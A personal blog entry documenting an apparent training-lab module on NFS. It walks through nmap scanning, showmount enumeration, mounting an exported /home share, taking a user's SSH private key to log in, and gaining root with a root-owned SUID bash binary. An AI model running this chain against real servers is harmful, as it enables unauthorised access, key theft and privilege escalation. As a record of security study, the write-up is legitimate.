---
title: Day 15
date: 2022-04-28
layout: post.njk
tags: daily
---

{{ page.date.toDateString }}

I wanted to knock out a module this morning, but I was busy with work again so I'm not getting to this until later.

The frist section is about NFS or [Network File System](https://en.wikipedia.org/wiki/Network_File_System). It just goes over the protocol at a high level but there are more details [here](https://docs.oracle.com/cd/E19683-01/816-4882/6mb2ipq7l/index.html).

I thought this was an interesting section in the reading:
> If someone wants to access a file using NFS, an RPC call is placed to NFSD (the NFS daemon) on the server. This call takes parameters such as:
> - The file handle
> - The name of the file to be accessed
> - The user's, user ID
> - The user's group ID
> These are used in determining access rights to the specified file. This is what controls user permissions, I.E read and write of files.

How do you pass the paramters into the call? Can it be faked? How does the authentication work? I'm guessing most of the exploitations will center around misconfigurations, but I'm curious how it works at a low level.

Here are some more usefule links:

- [datto](https://www.datto.com/blog/what-is-nfs-file-share)
- [sourceforge](http://nfs.sourceforge.net/)
- [arch linux](https://wiki.archlinux.org/title/NFS)

All the questions were easy and in the reading except for the question: what was the most recent version of NFS which I googled and got the answer on wikipedia.


In the enumeration phase of NFS I first learned about [nfs-common](https://packages.ubuntu.com/bionic/nfs-common).

So I first ran a port scan to see what ports are open I ran `nmap -sS <ip> -p-` I ran `-sS` to get information about the services running on the open ports.
I'm not sure if its the box but anytime I run a scan with -p- it's crazy slow.

Ok so that scan was going crazy slow it I changed it to:
> `nmap -sT <ip> -p 1-10000`

and I did it in chunks of 10000 and the results came back almost instantly. I did this up to 65535 and I figured out that there were 7 open ports and the NFS service was running on 2049.

I ran:
> `nmap -sS 10.10.86.162 -p 2049`
>
>`Starting Nmap 7.60 ( https://nmap.org ) at 2022-04-29 03:04 BST`

>`Nmap scan report for ip-10-10-86-162.eu-west-1.compute.internal (10.10.86.162)`

>`Host is up (0.00022s latency).`
>
>`PORT     STATE SERVICE`

>`2049/tcp open  nfs`

>`MAC Address: 02:67:85:2B:62:2F (Unknown)`
>
>`Nmap done: 1 IP address (1 host up) scanned in 0.55 seconds`

Not a ton of info there.

I ran:
>`$ /usr/sbin/showmount -e 10.10.86.162`
>
>`Export list for 10.10.86.162:`
>
>`/home *`

I ran:

>`$ sudo mount -t nfs 10.10.86.162:/home /tmp/mount -nolock`
> 
>`$ cd /tmp/mount`
>
>`$ ls`
>
>`cappucino`

That directory appeared to be a home directory for a user. It contained a .ssh file with an id_rsa. I copied that file out, changed the permissions to `600` and logged in via ssh using

>`ssh -i id_rsa cappucino@<ip>`.

Last part is exploiting NFS!

The reading talks about Root Squashing and the creation of SUID bit files.

So I downloaded the correspoding bash shell from this [github](https://github.com/TheRealPoloMints/Blog/blob/master/Security%20Challenge%20Walkthroughs/Networks%202/bash). I copied it into the mounted directory. I changed the owner to root via:

>`$ chown root bash`

I added the SUID permission via:
>`$ chmod +sx bash`

>`# ls -l bash`
>
>`-rwsr-sr-x 1 root root 1113504 Apr 29 03:25 bash`

Finally in the ssh session I ran:

> `./bash -p`

the -p flag maintains the permissions of the file.

I then got root and got the flag in the root directory!

This was a great section of the module. I definitely picked up a ton here, and I'm looking forward to the next two sections of this module.